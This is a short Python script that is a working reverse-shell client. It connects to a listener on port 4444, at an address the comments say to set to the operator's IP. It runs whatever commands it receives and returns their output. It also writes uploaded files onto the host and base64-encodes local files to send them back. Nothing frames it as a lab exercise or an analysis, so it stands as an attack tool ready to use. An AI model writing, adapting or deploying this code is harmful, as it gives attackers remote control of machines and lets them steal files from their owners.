#!/usr/bin/python3
import socket
import json
import subprocess
import os
import platform
import base64

server_ip = "127.0.0.1"   # <-- Change to listener IP if needed
server_port = 4444

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((server_ip, server_port))

system_os = platform.system()

def reliable_send(data):
    client_socket.send(json.dumps(data).encode())

def reliable_receive():
    data = b""
    while True:
        try:
            data += client_socket.recv(4096)
            return json.loads(data.decode())
        except ValueError:
            continue

try:
    while True:
        command_data = reliable_receive()
        command = command_data.get("cmd")

        if command == "exit":
            client_socket.close()
            break

        if command.startswith("upload "):
            _, path, content = command.split(" ", 2)
            with open(path, "wb") as f:
                f.write(base64.b64decode(content))
            reliable_send({"output": "[+] Upload complete"})
            continue

        if command.startswith("download "):
            path = command.split(" ")[1]
            with open(path, "rb") as f:
                file_data = base64.b64encode(f.read()).decode()
            reliable_send({"status": "ok", "data": file_data})
            continue

        output = subprocess.getoutput(command)
        reliable_send({"output": output})

except Exception as e:
    print("Error:", e)